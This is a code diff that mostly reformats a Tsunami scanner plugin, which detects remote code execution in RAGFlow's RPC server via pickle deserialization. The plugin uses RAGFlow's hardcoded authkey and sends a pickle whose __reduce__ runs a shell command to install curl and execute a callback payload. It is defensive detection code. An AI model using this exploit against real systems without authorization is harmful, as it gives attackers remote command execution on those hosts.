@@ -31,9 +31,9 @@ from common.net.http.http_client import HttpClient
 from plugin.payload.payload_generator import PayloadGenerator
 
 _VULN_DESCRIPTION = (
-    'The RAGFlow framework is vulnerable to an insecure deserialization issue'
-    ' that can be exploited by sending a simple pickle serialized payload to the'
-    ' RPC server. This can lead to remote code execution.'
+    "The RAGFlow framework is vulnerable to an insecure deserialization issue"
+    " that can be exploited by sending a simple pickle serialized payload to the"
+    " RPC server. This can lead to remote code execution."
 )
 _SLEEP_TIME_SEC = 20
 
@@ -41,9 +41,7 @@ _SLEEP_TIME_SEC = 20
 class RagFlowRceDetector(tsunami_plugin.VulnDetector):
     """A Tsunami Plugin that detects RCE on the RAGFlow target."""
 
-    def __init__(
-            self, http_client: HttpClient, payload_generator: PayloadGenerator
-    ):
+    def __init__(self, http_client: HttpClient, payload_generator: PayloadGenerator):
         self.http_client = http_client
         self.payload_generator = payload_generator
 
@@ -56,10 +54,10 @@ class RagFlowRceDetector(tsunami_plugin.VulnDetector):
         return tsunami_plugin.PluginDefinition(
             info=plugin_representation_pb2.PluginInfo(
                 type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
-                name='RagFlowRceDetector',
-                version='1.0',
+                name="RagFlowRceDetector",
+                version="1.0",
                 description=_VULN_DESCRIPTION,
-                author='am0o0',
+                author="am0o0",
             )
         )
 
@@ -79,12 +77,11 @@ class RagFlowRceDetector(tsunami_plugin.VulnDetector):
           A tsunami_plugin.DetectionReportList for all the vulnerabilities of the
           scanning target.
         """
-        logging.info('RAGFlowRceDetector starts detecting.')
+        logging.info("RAGFlowRceDetector starts detecting.")
         vulnerable_services = [
             service
             for service in matched_services
-            if self._IsSupportedService(service)
-               and self._IsRagFlowRpcService(service)
+            if self._IsSupportedService(service) and self._IsRagFlowRpcService(service)
         ]
 
         return detection_pb2.DetectionReportList(
@@ -101,12 +98,18 @@ class RagFlowRceDetector(tsunami_plugin.VulnDetector):
         """Check if network service is an unknown service."""
         return network_service.transport_protocol == TransportProtocol.TCP
 
-    def _IsRagFlowRpcService(self, network_service: tsunami_plugin.NetworkService) -> bool:
+    def _IsRagFlowRpcService(
+            self, network_service: tsunami_plugin.NetworkService
+    ) -> bool:
         # RAGFlow RPC Server reflect the name of data we send
-        c = Client((network_service.network_endpoint.ip_address.address,
-                    network_service.network_endpoint.port.port_number),
-                   authkey=b'infiniflow-token4kevinhu')
-        data = {'func_name': 'chat', 'args': ('messages', 'gen_conf'), 'kwargs': None}
+        c = Client(
+            (
+                network_service.network_endpoint.ip_address.address,
+                network_service.network_endpoint.port.port_number,
+            ),
+            authkey=b"infiniflow-token4kevinhu",
+        )
+        data = {"func_name": "chat", "args": ("messages", "gen_conf"), "kwargs": None}
         c.send(pickle.dumps(data))
         response = pickle.loads(c.recv())
         c.close()
@@ -130,16 +133,26 @@ class RagFlowRceDetector(tsunami_plugin.VulnDetector):
             def __reduce__(self):
                 # attempt to install curl if it is not already installed
                 return (
-                    __import__('os').system,
-                    (f'/bin/sh -c "apt-get update; apt-get install -y curl; {payload.get_payload()}"',))
+                    __import__("os").system,
+                    (
+                        f'/bin/sh -c "apt-get update; apt-get install -y curl; {payload.get_payload()}"',
+                    ),
+                )
 
         try:
-            c = Client((network_service.network_endpoint.ip_address.address,
-                        network_service.network_endpoint.port.port_number), authkey=b'infiniflow-token4kevinhu')
+            c = Client(
+                (
+                    network_service.network_endpoint.ip_address.address,
+                    network_service.network_endpoint.port.port_number,
+                ),
+                authkey=b"infiniflow-token4kevinhu",
+            )
             c.send(pickle.dumps(Payload()))
 
         except Exception:  # pylint: disable=broad-exception-caught
-            logging.exception('Unable to query %s', network_service.network_endpoint.hostname)
+            logging.exception(
+                "Unable to query %s", network_service.network_endpoint.hostname
+            )
 
         time.sleep(_SLEEP_TIME_SEC)
         return payload.check_if_executed()
@@ -157,10 +170,10 @@ class RagFlowRceDetector(tsunami_plugin.VulnDetector):
             detection_status=detection_pb2.DetectionStatus.VULNERABILITY_VERIFIED,
             vulnerability=vulnerability_pb2.Vulnerability(
                 main_id=vulnerability_pb2.VulnerabilityId(
-                    publisher='TSUNAMI_COMMUNITY', value='RagFlowRceDetector'
+                    publisher="TSUNAMI_COMMUNITY", value="RagFlowRceDetector"
                 ),
                 severity=vulnerability_pb2.Severity.CRITICAL,
-                title='RAGFlow RPC Server Insecure Deserialization RCE',
+                title="RAGFlow RPC Server Insecure Deserialization RCE",
                 recommendation=(
                     'Users should not expose "rag/llm/rpc_server.py" to the internet.'
                 ),
